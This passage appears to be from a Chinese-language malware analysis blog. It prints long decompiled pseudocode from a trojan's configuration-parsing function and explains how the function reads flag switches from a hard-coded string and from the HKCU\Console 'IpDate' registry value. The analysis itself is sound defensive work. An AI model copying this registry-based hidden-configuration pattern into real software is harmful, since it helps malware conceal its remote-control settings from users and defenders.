++v24;</span><br><span class="line">        if ( v25 &gt;= v22 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v25] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v25;</span><br><span class="line">        ++v24;</span><br><span class="line">        if ( v25 &gt;= v22 )</span><br><span class="line">          goto LABEL_49;</span><br><span class="line">      &#125;</span><br><span class="line">      v28 = dword_14005FCD0;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v28 = 1;</span><br><span class="line">      dword_14005FCD0 = v28;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_54:</span><br><span class="line">    v29 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v30 = lstrlenW(L&quot;sx:&quot;);</span><br><span class="line">    v31 = 0;</span><br><span class="line">    v32 = 0;</span><br><span class="line">    if ( (int)v29 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = 0;</span><br><span class="line">        for ( n = 0; n &lt; v30; ++v33 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++n;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v33 == v30 )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 += v30;</span><br><span class="line">          v31 += v30;</span><br><span class="line">          if ( v32 &lt; v29 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_62:</span><br><span class="line">        ++v32;</span><br><span class="line">        ++v31;</span><br><span class="line">        if ( v32 &gt;= v29 )</span><br><span class="line">          goto LABEL_67;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v32] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v32;</span><br><span class="line">        ++v31;</span><br><span class="line">        if ( v32 &gt;= v29 )</span><br><span class="line">          goto LABEL_62;</span><br><span class="line">      &#125;</span><br><span class="line">      v35 = dword_14005FCD4;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v35 = 1;</span><br><span class="line">      dword_14005FCD4 = v35;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_67:</span><br><span class="line">    v36 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v37 = lstrlenW(L&quot;bh:&quot;);</span><br><span class="line">    v38 = 0;</span><br><span class="line">    v39 = 0;</span><br><span class="line">    if ( (int)v36 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = 0;</span><br><span class="line">        for ( ii = 0; ii &lt; v37; ++v40 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++ii;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v40 == v37 )</span><br><span class="line">        &#123;</span><br><span class="line">          v39 += v37;</span><br><span class="line">          v38 += v37;</span><br><span class="line">          if ( v39 &lt; v36 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_75:</span><br><span class="line">        ++v39;</span><br><span class="line">        ++v38;</span><br><span class="line">        if ( v39 &gt;= v36 )</span><br><span class="line">          goto LABEL_80;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v39] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v39;</span><br><span class="line">        ++v38;</span><br><span class="line">        if ( v39 &gt;= v36 )</span><br><span class="line">          goto LABEL_75;</span><br><span class="line">      &#125;</span><br><span class="line">      v42 = dword_14005FCD8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v42 = 1;</span><br><span class="line">      dword_14005FCD8 = v42;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_80:</span><br><span class="line">    v43 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v44 = lstrlenW(L&quot;ll:&quot;);</span><br><span class="line">    v45 = 0;</span><br><span class="line">    v46 = 0;</span><br><span class="line">    if ( (int)v43 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v47 = 0;</span><br><span class="line">        for ( jj = 0; jj &lt; v44; ++v47 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++jj;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v47 == v44 )</span><br><span class="line">        &#123;</span><br><span class="line">          v46 += v44;</span><br><span class="line">          v45 += v44;</span><br><span class="line">          if ( v46 &lt; v43 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_88:</span><br><span class="line">        ++v46;</span><br><span class="line">        ++v45;</span><br><span class="line">        if ( v46 &gt;= v43 )</span><br><span class="line">          goto LABEL_93;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v46] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v46;</span><br><span class="line">        ++v45;</span><br><span class="line">        if ( v46 &gt;= v43 )</span><br><span class="line">          goto LABEL_88;</span><br><span class="line">      &#125;</span><br><span class="line">      v49 = dword_14005FCDC;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v49 = 1;</span><br><span class="line">      dword_14005FCDC = v49;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_93:</span><br><span class="line">    v50 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v51 = lstrlenW(L&quot;dl:&quot;);</span><br><span class="line">    v52 = 0;</span><br><span class="line">    v53 = 0;</span><br><span class="line">    if ( (int)v50 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v54 = 0;</span><br><span class="line">        for ( kk = 0; kk &lt; v51; ++v54 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++kk;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v54 == v51 )</span><br><span class="line">        &#123;</span><br><span class="line">          v53 += v51;</span><br><span class="line">          v52 += v51;</span><br><span class="line">          if ( v53 &lt; v50 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_101:</span><br><span class="line">        ++v53;</span><br><span class="line">        ++v52;</span><br><span class="line">        if ( v53 &gt;= v50 )</span><br><span class="line">          goto LABEL_106;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v53] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v53;</span><br><span class="line">        ++v52;</span><br><span class="line">        if ( v53 &gt;= v50 )</span><br><span class="line">          goto LABEL_101;</span><br><span class="line">      &#125;</span><br><span class="line">      v56 = dword_14005FCE0;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v56 = 1;</span><br><span class="line">      dword_14005FCE0 = v56;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_106:</span><br><span class="line">    v57 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v58 = lstrlenW(L&quot;sh:&quot;);</span><br><span class="line">    v59 = 0;</span><br><span class="line">    v60 = 0;</span><br><span class="line">    if ( (int)v57 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v61 = 0;</span><br><span class="line">        for ( mm = 0; mm &lt; v58; ++v61 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++mm;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v61 == v58 )</span><br><span class="line">        &#123;</span><br><span class="line">          v60 += v58;</span><br><span class="line">          v59 += v58;</span><br><span class="line">          if ( v60 &lt; v57 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_114:</span><br><span class="line">        ++v60;</span><br><span class="line">        ++v59;</span><br><span class="line">        if ( v60 &gt;= v57 )</span><br><span class="line">          goto LABEL_119;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v60] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v60;</span><br><span class="line">        ++v59;</span><br><span class="line">        if ( v60 &gt;= v57 )</span><br><span class="line">          goto LABEL_114;</span><br><span class="line">      &#125;</span><br><span class="line">      v63 = dword_14005FCE4;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v63 = 1;</span><br><span class="line">      dword_14005FCE4 = v63;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_119:</span><br><span class="line">    v64 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v65 = lstrlenW(L&quot;kl:&quot;);</span><br><span class="line">    v66 = 0;</span><br><span class="line">    v67 = 0;</span><br><span class="line">    if ( (int)v64 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v68 = 0;</span><br><span class="line">        for ( nn = 0; nn &lt; v65; ++v68 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++nn;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v68 == v65 )</span><br><span class="line">        &#123;</span><br><span class="line">          v67 += v65;</span><br><span class="line">          v66 += v65;</span><br><span class="line">          if ( v67 &lt; v64 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_127:</span><br><span class="line">        ++v67;</span><br><span class="line">        ++v66;</span><br><span class="line">        if ( v67 &gt;= v64 )</span><br><span class="line">          goto LABEL_132;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v67] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v67;</span><br><span class="line">        ++v66;</span><br><span class="line">        if ( v67 &gt;= v64 )</span><br><span class="line">          goto LABEL_127;</span><br><span class="line">      &#125;</span><br><span class="line">      v70 = dword_14005FCE8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v70 = 1;</span><br><span class="line">      dword_14005FCE8 = v70;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_132:</span><br><span class="line">    v71 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v72 = lstrlenW(L&quot;bd:&quot;);</span><br><span class="line">    v73 = 0;</span><br><span class="line">    v74 = 0;</span><br><span class="line">    if ( (int)v71 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v75 = 0;</span><br><span class="line">        for ( i1 = 0; i1 &lt; v72; ++v75 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++i1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v75 == v72 )</span><br><span class="line">        &#123;</span><br><span class="line">          v74 += v72;</span><br><span class="line">          v73 += v72;</span><br><span class="line">          if ( v74 &lt; v71 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_140:</span><br><span class="line">        ++v74;</span><br><span class="line">        ++v73;</span><br><span class="line">        if ( v74 &gt;= v71 )</span><br><span class="line">          goto LABEL_145;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v74] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v74;</span><br><span class="line">        ++v73;</span><br><span class="line">        if ( v74 &gt;= v71 )</span><br><span class="line">          goto LABEL_140;</span><br><span class="line">      &#125;</span><br><span class="line">      v77 = dword_14005FCEC;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v77 = 1;</span><br><span class="line">      dword_14005FCEC = v77;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_145:</span><br><span class="line">    Type = 3;</span><br><span class="line">    cbData = 0;</span><br><span class="line">    LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey);</span><br><span class="line">    if ( !(_DWORD)v0 )</span><br><span class="line">      LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData);</span><br><span class="line">    if ( cbData &gt; 0xA )</span><br><span class="line">    &#123;</span><br><span class="line">      memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u);       // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      sub_140008620(L&quot;p1:&quot;, &amp;Source);</span><br><span class="line">      sub_140008620(L&quot;o1:&quot;, &amp;Source__1);</span><br><span class="line">      v78 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      v79 = lstrlenW(L&quot;t1:&quot;);</span><br><span class="line">      v80 = 0;</span><br><span class="line">      v81 = 0;</span><br><span class="line">      if ( (int)v78 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v82 = 0;</span><br><span class="line">          for ( i2 = 0; i2 &lt; v79; ++v82 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">              break;</span><br><span class="line">            ++i2;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v82 == v79 )</span><br><span class="line">          &#123;</span><br><span class="line">            v81 += v79;</span><br><span class="line">            v80 += v79;</span><br><span class="line">            if ( v81 &lt; v78 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_156:</span><br><span class="line">          ++v81;</span><br><span class="line">          ++v80;</span><br><span class="line">          if ( v81 &gt;= v78 )</span><br><span class="line">            goto LABEL_157;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v81] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v81;</span><br><span class="line">          ++v80;</span><br><span class="line">          if ( v81 &gt;= v78 )</span><br><span class="line">            goto LABEL_156;</span><br><span class="line">        &#125;</span><br><span class="line">        v90 = dword_14005F6A8;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v90 = 1;</span><br><span class="line">        dword_14005F6A8 = v90;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_157:</span><br><span class="line">      sub_140008620(L&quot;p2:&quot;, &amp;Source_);</span><br><span class="line">      sub_140008620(L&quot;o2:&quot;, &amp;Source__0);</span><br><span class="line">      v84 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      v85 = lstrlenW(L&quot;t2:&quot;);</span><br><span class="line">      v86 = 0;</span><br><span class="line">      v87 = 0;</span><br><span class="line">      if ( (int)v84 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v88 = 0;</span><br><span class="line">          for ( i3 = 0; i3 &lt; v85; ++v88 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">              break;</span><br><span class="line">            ++i3;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v88 == v85 )</span><br><span class="line">          &#123;</span><br><span class="line">            v87 += v85;</span><br><span class="line">            v86 += v85;</span><br><span class="line">            if ( v87 &lt; v84 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_165:</span><br><span class="line">          ++v87;</span><br><span class="line">          ++v86;</span><br><span class="line">          if ( v87 &gt;= v84 )</span><br><span class="line">            goto LABEL_173;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v87] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v87;</span><br><span class="line">          ++v86;</span><br><span class="line">          if ( v87 &gt;= v84 )</span><br><span class="line">            goto LABEL_165;</span><br><span class="line">        &#125;</span><br><span class="line">        v91 = dword_14005F8E8;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v91 = 1;</span><br><span class="line">        dword_14005F8E8 = v91;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_173:</span><br><span class="line">      sub_140008620(L&quot;p3:&quot;, &amp;Source__2);</span><br><span class="line">      sub_140008620(L&quot;o3:&quot;, &amp;Source__3);</span><br><span class="line">      v92 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      LODWORD(v0) = lstrlenW(L&quot;t3:&quot;);</span><br><span class="line">      v93 = 0;</span><br><span class="line">      v94 = 0;</span><br><span class="line">      v95 = (int)v0;</span><br><span class="line">      if ( (int)v92 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v96 = 0;</span><br><span class="line">          v97 = 0;</span><br><span class="line">          if ( (int)v95 &gt; 0 )</span><br><span class="line">          &#123;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">              LODWORD(v0) = aT3[v97];</span><br><span class="line">              if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">                break;</span><br><span class="line">              ++v97;</span><br><span class="line">              ++v96;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( v97 &lt; v95 );</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v96 == (_DWORD)v95 )</span><br><span class="line">          &#123;</span><br><span class="line">            v94 += v95;</span><br><span class="line">            v93 += v95;</span><br><span class="line">            if ( v94 &lt; v92 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_181:</span><br><span class="line">          ++v94;</span><br><span class="line">          ++v93;</span><br><span class="line">          if ( v94 &gt;= v92 )</span><br><span class="line">            return (int)v0;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v94] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v94;</span><br><span class="line">          ++v93;</span><br><span class="line">          if ( v94 &gt;= v92 )</span><br><span class="line">            goto LABEL_181;</span><br><span class="line">        &#125;</span><br><span class="line">        v98 = dword_14005FB28;</span><br><span class="line">        LODWORD(v0) = v93;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v98 = 1;</span><br><span class="line">        dword_14005FB28 = v98;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return (int)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.打开注册表键 (Open Key)<br>这一行尝试打开 <code>HKEY_CURRENT_USER\Console</code> 键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey);</span><br></pre></td></tr></table></figure><p>2.第一次查询值 (Query Value - Get Size)<br>如果打开成功，这一行查询 <code>IpDate</code> 值的数据大小 (<code>cbData</code>)，但不读取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( !(_DWORD)v0 )</span><br><span class="line">  LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData);</span><br></pre></td></tr></table></figure><p>3.第二次查询值 (Query Value - Read Data)</p><p>如果第一次查询显示数据大小大于 <code>0xA</code>，则进入这段代码，<strong>这一行实际读取了</strong> <code>IpDate</code> <strong>的数据</strong> 到字符串 <code>a0Db0Lk0Hs0Ld0L</code> 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902013-96e2d5c2-004f-42de-b323-232bd4699bd3.png" alt="null"></p><p>注册表确实有东西<br>但是我现在也不知道这个是干啥用的解码后就只有这个Ipdatetime<br>(9-27-1-25-18)</p><p>这个函数 <code>sub_140008750</code> 是 <strong>木马的配置解析初始化函数</strong>，核心作用是：从「内置硬编码字符串」或「Windows 注册表」中读取配置信息，解析后设置一系列功能开关（全局变量），仅在程序启动时执行一次（通过标志位控制）<br>黑客植入的恶意程序中「读取控制配置」的模块，解析是否启用远控、数据上传、端口转发等功能的开关</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902135-aed8d6b2-db84-4dd2-8761-2c9bc88b802f.jpg" alt="null"><br>上面图片”|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|”<br>这里可以得到5202是混淆后的时间就是2025年11月9日</p><p>查看sub_140003390函数的反编译结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 